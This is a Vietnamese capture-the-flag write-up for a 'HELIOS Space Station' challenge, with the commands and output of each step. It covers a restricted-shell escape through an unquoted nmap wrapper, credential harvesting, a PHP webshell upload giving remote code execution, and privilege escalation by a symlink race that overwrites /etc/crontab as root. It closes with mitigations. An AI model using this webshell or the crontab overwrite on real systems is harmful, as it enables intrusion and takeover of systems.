# HELIOS Space Station - Full Writeup (Analyze + Exploit + Verbose Output)

## 0) Thông tin challenge
- Target: `194.102.62.175:20539`
- Credential ban đầu: `pilot:docking-request`
- Mục tiêu: tìm unauthorized beacon / lấy flag
- Kết quả cuối: PrivEsc thành công lên root và lấy được flag

---

## 1) Analyze tổng quan

### 1.1 Xác định dịch vụ đầu vào

```bash
nmap -sV -p20539 194.102.62.175
```

Output:

```text
PORT      STATE SERVICE VERSION
20539/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
```

=> Port challenge thực chất là SSH.

---

### 1.2 Đăng nhập và kiểm tra restricted shell

Đăng nhập:

```bash
ssh -p 20539 pilot@194.102.62.175
# password: docking-request
```

Banner + help:

```text
★ HELIOS DOCKING PORT - CONNECTED ★
Welcome, pilot. Restricted terminal active.
Internal network detected: 127.13.37.0/24

AVAILABLE COMMANDS:
  nmap <target>
  help
  exit
```

=> User `pilot` bị giới hạn chỉ chạy `nmap`.

---

### 1.3 Phân tích logic restricted shell

Đọc file wrapper:

```bash
cat /usr/local/bin/pilot-shell.sh
```

Điểm quan trọng:
- Dòng chạy lệnh là ` /usr/bin/nmap $args ` (không quote).
- Điều này mở ra vector wildcard expansion và đọc file qua `-iL`.

---

## 2) Enumerate internal network & web apps

### 2.1 Tìm host/port nội bộ

```bash
nmap 127.13.37.0/24 -sT -p 1-10000 --open -n -oG -
```

Kết quả chính:
- `127.13.37.123` mở:
  - `8445/tcp` (Python SimpleHTTPServer)
  - `9043/tcp` (Apache)

Scan service:

```bash
nmap 127.13.37.123 -sV -p8445,9043 --open
```

Output:

```text
8445/tcp open  http    SimpleHTTPServer 0.6 (Python 3.10.12)
9043/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
```

---

### 2.2 Lộ source web bằng wildcard + -iL

Ví dụ enumerate path:

```bash
nmap 127.13.37.1 /var/www/html/*
```

Lộ các path:
- `/var/www/html/index.html`
- `/var/www/html/cosmos-data`
- `/var/www/html/stargate`

Đọc source:

```bash
nmap 127.13.37.1 -iL /var/www/html/stargate/index.php
nmap 127.13.37.1 -iL /var/www/html/stargate/dashboard.php
nmap 127.13.37.1 -iL /var/www/html/stargate/db_config.php
```

Phát hiện quan trọng:
- `dashboard.php` có upload file vào `/var/www/html/cosmos-data/` và cho phép `.php`.
- `db_config.php` chứa:
  - `sync_user = nova`
  - `sync_pass = <chuỗi rất dài>`
  - `sync_script = /home/nova/orbit-sync.sh`

---

### 2.3 Lấy credential user web

Đọc script init DB:

```bash
nmap 127.13.37.1 -iL /tmp/init_db.sh
```

Từ script này rút ra password rõ cho `astrid`:
- `astrid / apollo1`

---

## 3) Pivot quan trọng: SSH local port-forward

Vì shell bị giới hạn, mình mở tunnel qua SSH để dùng `curl` local:

```bash
ssh -N -L 18445:127.13.37.123:8445 -L 19043:127.13.37.123:9043 -p 20539 pilot@194.102.62.175
```

Kiểm tra:

```bash
curl -I http://127.0.0.1:19043/
curl -I http://127.0.0.1:18445/
```

Output:

```text
HTTP/1.1 200 OK
Server: Apache/2.4.52 (Ubuntu)
...

HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.10.12
...
```

---

## 4) Exploit web -> RCE (www-data)

### 4.1 Login stargate

```bash
curl -i -c /tmp/helios.cookies -d 'username=astrid&password=apollo1' http://127.0.0.1:19043/stargate/
```

Output:

```text
HTTP/1.1 302 Found
Location: dashboard.php
```

=> Login thành công.

### 4.2 Upload webshell

Tạo payload:

```php
<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>
```

Upload:

```bash
curl -b /tmp/helios.cookies -F 'datafile=@/tmp/cmd.php;filename=cmd.php' -F 'upload_telemetry=1' http://127.0.0.1:19043/stargate/dashboard.php
```

RCE test:

```bash
curl 'http://127.0.0.1:19043/cosmos-data/cmd.php?cmd=id'
```

Output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 5) Analyze post-exploitation

### 5.1 Đọc thông tin khởi tạo hệ thống

```bash
curl -s 'http://127.0.0.1:19043/cosmos-data/cmd.php?cmd=cat+/entrypoint.sh'
```

Điểm cực quan trọng trong `/entrypoint.sh`:
- Cron chạy mỗi phút:
  - `* * * * * root /bin/bash /home/nova/orbit-sync.sh`
- File log world-writable:
  - `/var/log/orbit-sync.log`
- Copy/sync telemetry pipeline diễn ra định kỳ.

### 5.2 Quan sát cron sync log

```bash
curl -s 'http://127.0.0.1:19043/cosmos-data/cmd.php?cmd=tail+-n+20+/var/log/orbit-sync.log'
```

Dạng output lặp:

```text
[... UTC] Orbital sync initiated...
[... UTC] Telemetry data synced: N files
[... UTC] Orbital sync complete.
```

### 5.3 Xác nhận backup đích chạy bởi root

```bash
curl -s 'http://127.0.0.1:19043/cosmos-data/cmd.php?cmd=ls+-la+/var/backups/telemetry'
```

Output mẫu:

```text
-rw-r--r-- 1 root root ... /var/backups/telemetry/cmd.php
-rw-r--r-- 1 root root ... /var/backups/telemetry/telemetry.php
...
```

=> Root đang copy file từ `cosmos-data` sang `/var/backups/telemetry` mỗi phút.

---

## 6) PrivEsc root bằng symlink write-primitive (2 phase)

## Ý tưởng
Nếu destination trong `/var/backups/telemetry` là symlink tới file hệ thống tồn tại, thì lần sync sau có thể ghi đè target đó bằng nội dung file source cùng tên trong `cosmos-data`.

### 6.1 Phase 1 - tạo symlink ở source

```bash
# qua webshell
ln -s /tmp/pwncheck /var/www/html/cosmos-data/syncprobe
```

Chờ 1 vòng cron -> destination có symlink root-owned:

Output kiểm tra:

```text
lrwxrwxrwx 1 root root ... /var/backups/telemetry/syncprobe -> /tmp/pwncheck
```

### 6.2 Phase 2 - thay source thành file thường cùng tên

```bash
echo ROOT_WRITE_TEST_... > /var/www/html/cosmos-data/syncprobe
```

Khi `/tmp/pwncheck` tồn tại, vòng sync kế tiếp ghi đè thành công (xác nhận primitive).

---

## 7) Weaponization: overwrite `/etc/crontab`

### 7.1 Tạo symlink tới `/etc/crontab`

```bash
ln -s /etc/crontab /var/www/html/cosmos-data/cronpwn
```

Chờ 1 vòng để backup chứa:

```text
/var/backups/telemetry/cronpwn -> /etc/crontab
```

### 7.2 Ghi payload crontab từ source file thường

```cron
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
* * * * * root /bin/bash /tmp/runme.sh
* * * * * root /bin/bash /home/nova/orbit-sync.sh
```

Sau vòng sync kế tiếp, xác nhận `/etc/crontab` đã bị overwrite:

```text
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
* * * * * root /bin/bash /tmp/runme.sh
* * * * * root /bin/bash /home/nova/orbit-sync.sh
```

---

## 8) Root command execution + lấy flag

### 8.1 Tạo `/tmp/runme.sh`

```bash
#!/bin/bash
id > /var/www/html/cosmos-data/rootid.txt
cat /root/root.txt > /var/www/html/cosmos-data/finalflag.txt 2>/var/www/html/cosmos-data/finalflag.err
cat /root/flag* /flag* 2>/dev/null > /var/www/html/cosmos-data/rootflag.txt
```

Chờ cron chạy.

### 8.2 Proof root

```bash
cat /var/www/html/cosmos-data/rootid.txt
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

### 8.3 Flag cuối

```bash
cat /var/www/html/cosmos-data/finalflag.txt
```

Output:

```text
UVT{y0u_f0und_m3_1n_4_d4rk_c0rn3r_fr0m_4_sh4d0w_t3rm1n4l_h0peFully_y0U_WoUlD_r3MemBer_M3!!!_1_will_watch_yOur_m0v3s_frOm_h3r3}
```

---

## 9) Tóm tắt chain exploit (ngắn gọn)
1. SSH vào `pilot` restricted shell.
2. Abuse wrapper `nmap $args` để enumerate source/config nội bộ.
3. Lấy `astrid/apollo1` từ init artifact.
4. SSH port-forward sang internal web (`9043`) + file server (`8445`).
5. Login stargate, upload `.php`, đạt RCE `www-data`.
6. Phân tích cron sync root -> backup pipeline.
7. Dùng 2-phase symlink primitive để overwrite `/etc/crontab`.
8. Cron root chạy payload, đọc `/root/root.txt` -> flag.

---

## 10) Root cause & mitigation

### Root cause
- Upload `.php` vào web-root executable (`/cosmos-data`) => RCE trực tiếp.
- Root cron sync xử lý file không an toàn, cho phép symlink-based overwrite trên destination.
- Quyền file/log và thiết kế pipeline quá rộng (`root` copy data từ thư mục user-controlled).

### Khuyến nghị fix
- Disable PHP execution trong thư mục upload (`RemoveHandler`/`php_admin_flag engine off`).
- Validate upload strict MIME + extension allowlist (không cho `.php`).
- Cron sync dùng `rsync --safe-links --copy-links`/`--links` phù hợp + `--no-specials --no-devices`, và reject symlink từ source.
- Không chạy sync bằng `root`; dùng user least-privilege.
- Bảo vệ destination khỏi overwrite ngoài ý muốn (immutable policy, safe temp + atomic move).

